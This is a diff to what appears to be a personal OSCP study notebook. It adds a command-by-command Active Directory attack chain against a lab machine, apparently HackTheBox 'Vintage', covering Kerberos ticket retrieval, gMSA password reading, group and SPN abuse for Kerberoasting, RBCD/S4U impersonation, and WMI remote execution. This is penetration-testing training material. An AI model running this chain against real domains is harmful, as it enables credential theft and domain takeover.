@@ -460,6 +460,50 @@ The first WMI failure in RockyColt was name resolution. A valid ticket still nee
 
 `msDS-AllowedToActOnBehalfOfOtherIdentity` is a binary security descriptor, not a normal string-valued LDAP attribute. A generic `set object -v` call attempted to encode the account name as a descriptor and failed. `bloodyAD add rbcd` is the correct abstraction because it resolves the service-account SID and constructs the descriptor.
 
+## Vintage: ccache-backed AD chain
+
+```bash
+# Supplied account: obtain and validate a Kerberos TGT when NTLM is disabled.
+getTGT.py "$Domain/P.Rosa:Rosaisbest123" -dc-ip $BoxIP
+KRB5CCNAME=$BoxDir/loot/P.Rosa.ccache \
+  nxc smb $FQDN -d $Domain -k --use-kcache --kdcHost $BoxIP
+
+# Collect the graph and read the gMSA managed password with the pre-created machine account.
+KRB5CCNAME=$BoxDir/loot/P.Rosa.ccache \
+  bloodhound-python -u P.Rosa -d $Domain -k -no-pass \
+  --auth-method kerberos -ns $BoxIP -dc $FQDN -c All --zip
+getTGT.py "$Domain/FS01$:fs01" -dc-ip $BoxIP
+
+# After parsing the gMSA NT hash, use the gMSA's group right.
+bloodyAD -d $Domain -u 'gMSA01$' -k \
+  ccache=$BoxDir/loot/gMSA01$.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP add groupMember ServiceManagers 'gMSA01$'
+
+# Enable the target service account, set one SPN, and target only that user.
+bloodyAD -d $Domain -u 'gMSA01$' -k \
+  ccache=$BoxDir/loot/gMSA01$.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP set object svc_sql userAccountControl -v 512
+bloodyAD -d $Domain -u 'gMSA01$' -k \
+  ccache=$BoxDir/loot/gMSA01$.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP set object svc_sql servicePrincipalName \
+  -v 'http/svc_sql.vintage.htb'
+GetUserSPNs.py "$Domain/gMSA01$" -k -no-pass -dc-ip $BoxIP \
+  -usersfile $BoxDir/loot/spn-targets.txt \
+  -outputfile $BoxDir/loot/kerberoast.hashes
+
+# After DPAPI recovers C.Neri_adm, add the SPN-bearing machine to the trusted group.
+bloodyAD -d $Domain -u C.Neri_adm -k \
+  ccache=$BoxDir/loot/c.neri_adm.ccache kdc=$BoxIP \
+  -H $FQDN -i $BoxIP add groupMember DelegatedAdmins 'FS01$'
+getTGT.py "$Domain/FS01$:fs01" -dc-ip $BoxIP
+getST.py -spn "cifs/$FQDN" -impersonate L.Bianchi_adm \
+  -k -no-pass -dc-ip $BoxIP "$Domain/FS01$"
+KRB5CCNAME=$BoxDir/loot/L.Bianchi_adm.ccache \
+  wmiexec.py -k -no-pass "$Domain/L.Bianchi_adm@$FQDN" 'whoami'
+```
+
+The order matters: directory changes, group/token verification, ticket renewal, S4U, and service use are distinct evidence points. See [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]].
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
@@ -479,4 +523,5 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- demonstrates why RBCD needs a binary security descriptor and how the S4U chain consumes it
+- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- demonstrates a Kerberos-only group-based RBCD chain with gMSA and DPAPI stages
 - [[OSCP/BOXES/WRITE UPS/AD/Fermion|Fermion]] -- demonstrates recursive SMB collection, offline `ntds.dit` + SYSTEM parsing, and Administrator pass-the-hash
